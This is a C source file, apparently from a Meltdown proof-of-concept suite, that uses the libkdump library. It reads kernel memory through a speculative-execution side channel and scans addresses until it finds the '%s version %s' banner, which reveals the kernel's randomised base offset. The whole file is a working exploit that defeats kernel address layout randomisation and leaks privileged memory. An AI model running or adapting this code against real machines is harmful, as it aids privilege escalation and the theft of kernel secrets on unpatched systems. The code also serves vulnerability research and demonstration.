/* gcc -o look_for_proc_version look_for_proc_version.c -I../libkdump -L../libkdump ../libkdump/libkdump.a -lpthread */
#include "libkdump.h"
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <fcntl.h>

static int running = 1;

static void sigint(int signum __attribute__((unused))) {
  running = 0;
}

static void read_proc_version(void *data) {
  static char buf[1024];
  int fd = (int)(uintptr_t) data, ret;
  ret = pread(fd, buf, sizeof(buf), 0);
}

static int libkdump_read_str(size_t start, char *buf, size_t size) {
  size_t i;

  for (i = 0; i < size; i++) {
    buf[i] = libkdump_read(start + i);
  }

  return 0;
}

static int hamming(char *a, char *b, size_t len)
{
  int h = 0;
  size_t i;

  for (i = 0; i < len; i++) {
    h += a[i] != b[i];
  }

  return h;
}

int main(int argc, char *argv[]) {
  libkdump_config_t config;
  size_t offset = 0xffffffff80000000UL;
  size_t step = 0x100000;
  size_t delta = 0;
  size_t start = 0;
  int progress = 0, proc_version_fd;
  static char sample[] = "%s version %s";
  char buf[sizeof(sample)];

  if (argc >= 2) {
    start = strtoull(argv[1], NULL, 0) & 0xfffffff;
  } else {
    printf("run with `linux_proc_banner` value from System.map as first arg\n");
    exit(1);
  }

  proc_version_fd = open("/proc/version", O_RDONLY);
  if (proc_version_fd < 0) {
    perror("can't open /proc/version");
    exit(1);
  }

  config = libkdump_get_autoconfig();
  config.retries = 30;
  config.measurements = 2;
  config.massage_kernel = read_proc_version;
  config.massage_data = (void *)(uintptr_t)proc_version_fd;

  libkdump_init(config);

  signal(SIGINT, sigint);

  while (running) {
    (void) libkdump_read_str(start + offset + delta, buf, sizeof(buf));
#if 0
    if (delta > 0xffffffff87c000a0 - 0xffffffff81a000a0)
	    break;
#endif
    if (hamming(sample, buf, sizeof(buf)) < sizeof(buf) / 2) {
      printf("\r\x1b[32;1m[+]\x1b[0m Kernel map offset: \x1b[33;1m0x%zx\x1b[0m\n", offset + delta);
      fflush(stdout);
      break;
    } else {
      delta += step;
      if (delta >= -1ull - offset) {
        delta = 0;
        step >>= 4;
      }
      fprintf(stderr, "\r\x1b[34;1m[%c]\x1b[0m 0x%zx    ", "/-\\|"[(progress++ / 400) % 4], offset + delta + start);
    }
  }

  libkdump_cleanup();
  close(proc_version_fd);

  return 0;
}
